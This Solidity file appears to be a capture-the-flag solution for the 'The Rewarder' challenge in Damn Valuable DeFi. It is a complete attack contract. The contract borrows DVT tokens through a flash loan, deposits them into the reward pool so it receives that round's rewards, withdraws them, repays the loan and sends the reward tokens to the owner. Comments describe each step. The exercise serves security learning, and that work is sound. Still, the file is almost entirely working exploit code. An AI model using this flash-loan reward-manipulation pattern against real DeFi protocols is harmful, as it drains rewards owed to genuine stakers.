// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.7;

import "../Contracts/the-rewarder/TheRewarderPool.sol";
import "../Contracts/the-rewarder/FlashLoanerPool.sol";
import "../Contracts/DamnValuableToken.sol";

contract TheRewarderAttack {
    FlashLoanerPool flashLoanpool;
    TheRewarderPool rewardPool;
    DamnValuableToken public immutable liquidityToken;
    address payable owner;

    constructor(
        address _flashLoanpool,
        address _liquidityToken,
        address _rewardPool,
        address payable _owner
    ) {
        flashLoanpool = FlashLoanerPool(_flashLoanpool);
        rewardPool = TheRewarderPool(_rewardPool);
        liquidityToken = DamnValuableToken(_liquidityToken);
        owner = _owner;
    }

    function attack(uint256 amount) external {
        // 1. we need to call flashLoan() for dvt token

        flashLoanpool.flashLoan(amount);
    }

    // after we call flash loan we need to receive it with fallback function

    fallback() external {
        uint256 balance = liquidityToken.balanceOf(address(this));

        liquidityToken.approve(address(rewardPool), balance);

        // 2. after we received tokens we need to imidiately call deposit()

        rewardPool.deposit(balance);

        // 3. after we deposited then we can call withdraw() with all funds

        rewardPool.withdraw(balance);

        // 4. after withdraw we need to pay flashLoan

        liquidityToken.transfer(address(flashLoanpool), balance);

        // 5. after we pay flashLoan, transfer rewards to attacker
        uint256 rewardBalance = rewardPool.rewardToken().balanceOf(
            address(this)
        );

        rewardPool.rewardToken().transfer(owner, rewardBalance);
    }
}
